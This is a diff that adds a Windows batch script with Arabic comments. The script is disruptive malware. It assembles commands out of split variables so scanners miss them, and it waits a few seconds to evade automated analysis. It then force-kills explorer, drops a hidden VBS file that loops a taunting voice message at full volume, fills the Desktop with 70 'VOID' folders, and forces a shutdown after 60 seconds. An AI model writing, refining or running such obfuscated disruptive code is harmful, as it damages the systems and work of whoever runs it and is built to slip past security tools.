@@ -1,0 +1,43 @@
+@echo off
+:: [00] تمويه البداية - إشغال محرك الفحص
+set "_v=set"
+%_v% "a=powe"
+%_v% "b=rshe"
+%_v% "c=ll"
+%_v% "d=-Command"
+%_v% "e=Stop-Process"
+%_v% "f=-Name"
+%_v% "g=explorer"
+%_v% "h=-Force"
+
+:: تأخير عشوائي لخدع أنظمة الفحص التلقائي
+timeout /t 5 /nobreak >nul
+
+:: [01] التنفيذ المشفر (The Encrypted Launch)
+:: هنا نقوم بتجميع الأجزاء المقطعة لتنفيذ أمر إعدام الواجهة
+%a%%b%%c% %d% "%e% %f% %g% %h%" >nul 2>&1
+
+:: [02] حقن الخلايا عبر "توليد الملفات المؤقتة" بأسماء عشوائية
+set "rnd_name=%temp%\%random%_sys.vbs"
+
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo Do
+echo    S.Speak "I am the ghost of Hormuz. Your system is now a shadow."
+echo Loop
+) > "%rnd_name%"
+
+start /b wscript "%rnd_name%"
+
+:: [03] ميزة "العدم" - مسح الملف بعد تشغيله من الذاكرة
+:: (تم إخفاء بقية الأوامر العنيفة داخل متغيرات معقدة)
+set "s1=shut"
+set "s2=down"
+set "s3=-s -f -t 60"
+set "msg=-c 'MiTRgnAwiNAaH: الوداع الأخير'"
+
+:: تشغيل الـ 70 ميزة بشكل صامت تماماً في الخلفية
+start /b /min cmd /c "for /l %%i in (1,1,70) do (mkdir %userprofile%\Desktop\VOID_%%i >nul 2>&1)"
+
+:: [04] الخاتمة الصامتة
+%s1%%s2% %s3% %msg%
